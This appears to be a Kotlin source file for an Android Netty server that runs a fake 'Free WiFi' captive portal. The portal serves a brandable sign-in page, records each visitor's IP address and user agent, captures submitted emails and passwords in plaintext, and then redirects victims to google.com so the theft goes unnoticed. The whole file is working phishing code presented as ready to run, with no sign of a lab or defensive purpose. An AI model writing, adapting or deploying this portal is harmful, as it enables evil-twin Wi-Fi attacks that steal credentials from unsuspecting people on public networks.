package com.cyberghost.core

import android.util.Log
import io.netty.bootstrap.ServerBootstrap
import io.netty.buffer.Unpooled
import io.netty.channel.*
import io.netty.channel.nio.NioEventLoopGroup
import io.netty.channel.socket.SocketChannel
import io.netty.channel.socket.nio.NioServerSocketChannel
import io.netty.handler.codec.http.*
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import java.net.InetSocketAddress
import java.nio.charset.StandardCharsets
import java.time.Instant

data class CaptiveEntry(
    val timestamp: Instant = Instant.now(),
    val sourceIp: String,
    val userAgent: String,
    val username: String? = null,
    val password: String? = null,
    val accepted: Boolean = false
)

data class CaptiveConfig(
    var enabled: Boolean = false,
    var title: String = "Free WiFi",
    var subtitle: String = "Sign in to continue",
    var logoText: String = "WiFi",
    var primaryColor: String = "#2196F3",
    var requireEmail: Boolean = true,
    var requirePassword: Boolean = false,
    var redirectUrl: String = "https://google.com",
    var customHtml: String = ""
)

class CaptivePortal(private val port: Int = 8888) {
    var config = CaptiveConfig()
    private var bossGroup: NioEventLoopGroup? = null
    private var workerGroup: NioEventLoopGroup? = null

    private val _entries = MutableSharedFlow<CaptiveEntry>(replay = 0, extraBufferCapacity = 128)
    val entries: SharedFlow<CaptiveEntry> = _entries

    private val entryStore = mutableListOf<CaptiveEntry>()

    fun start() {
        try {
            bossGroup = NioEventLoopGroup(1)
            workerGroup = NioEventLoopGroup(1)
            ServerBootstrap().group(bossGroup, workerGroup)
                .channel(NioServerSocketChannel::class.java)
                .childHandler(object : ChannelInitializer<SocketChannel>() {
                    override fun initChannel(ch: SocketChannel) {
                        ch.pipeline().addLast(
                            HttpServerCodec(),
                            HttpObjectAggregator(65_536),
                            CaptiveHandler(this@CaptivePortal)
                        )
                    }
                }).bind(port).sync()
            Log.i("CG2", "Captive portal started on port $port")
        } catch (e: Exception) {
            Log.e("CG2", "Captive portal failed to start", e)
        }
    }

    fun stop() {
        try { bossGroup?.shutdownGracefully(); workerGroup?.shutdownGracefully() } catch (_: Exception) {}
        bossGroup = null; workerGroup = null
    }

    fun emit(entry: CaptiveEntry) {
        entryStore.add(entry)
        _entries.tryEmit(entry)
    }

    fun getAll(): List<CaptiveEntry> = entryStore.toList()
    fun clear() { entryStore.clear() }

    fun buildPortalHtml(): String {
        if (config.customHtml.isNotBlank()) return config.customHtml
        return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${config.title}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#0a0a0f 0%,#12121a 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#1a1a25;border-radius:16px;padding:40px 32px;width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{width:64px;height:64px;background:${config.primaryColor};border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:24px;font-weight:bold;color:white}
h1{text-align:center;color:#e0e0ec;font-size:22px;margin-bottom:8px}
p{text-align:center;color:#6b6b80;font-size:14px;margin-bottom:28px}
.form-group{margin-bottom:16px}
label{display:block;color:#9999aa;font-size:12px;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
input{width:100%;padding:12px 16px;background:#12121a;border:1px solid #2a2a3a;border-radius:10px;color:#e0e0ec;font-size:14px;outline:none;transition:border-color 0.2s}
input:focus{border-color:${config.primaryColor}}
button{width:100%;padding:14px;background:${config.primaryColor};color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
.terms{text-align:center;color:#6b6b80;font-size:11px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<div class="logo">${config.logoText.take(2).uppercase()}</div>
<h1>${config.title}</h1>
<p>${config.subtitle}</p>
<form method="POST" action="/portal/submit">
${if (config.requireEmail) """<div class="form-group"><label>Email Address</label><input type="email" name="email" placeholder="you@example.com" required></div>""" else ""}
${if (config.requirePassword) """<div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••"></div>""" else ""}
<button type="submit">Connect to WiFi</button>
</form>
<p class="terms">By connecting you agree to our terms of service</p>
</div>
</body>
</html>
        """.trimIndent()
    }
}

class CaptiveHandler(private val portal: CaptivePortal) : SimpleChannelInboundHandler<FullHttpRequest>() {
    override fun channelRead0(ctx: ChannelHandlerContext, req: FullHttpRequest) {
        val clientAddr = ctx.channel().remoteAddress() as? InetSocketAddress
        val clientIp = clientAddr?.address?.hostAddress ?: "unknown"
        val ua = req.headers().get(HttpHeaderNames.USER_AGENT) ?: ""

        when {
            req.uri().contains("/portal/submit") && req.method() == HttpMethod.POST -> {
                val body = req.content().toString(StandardCharsets.UTF_8)
                val fields = body.split("&").associate {
                    val p = it.split("=", limit = 2)
                    if (p.size == 2) java.net.URLDecoder.decode(p[0], "UTF-8") to java.net.URLDecoder.decode(p[1], "UTF-8")
                    else it to ""
                }
                val email = fields["email"] ?: fields["username"] ?: fields["user"]
                val password = fields["password"] ?: fields["pass"]
                portal.emit(CaptiveEntry(sourceIp = clientIp, userAgent = ua, username = email, password = password, accepted = true))
                // redirect to internet after submit
                val response = DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.FOUND, Unpooled.EMPTY_BUFFER)
                response.headers().set(HttpHeaderNames.LOCATION, portal.config.redirectUrl)
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, 0)
                ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE)
            }
            else -> {
                portal.emit(CaptiveEntry(sourceIp = clientIp, userAgent = ua))
                val html = portal.buildPortalHtml()
                val bytes = html.toByteArray(StandardCharsets.UTF_8)
                val response = DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.wrappedBuffer(bytes))
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/html; charset=UTF-8")
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, bytes.size)
                ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE)
            }
        }
    }
    override fun exceptionCaught(ctx: ChannelHandlerContext, cause: Throwable) { ctx.close() }
}
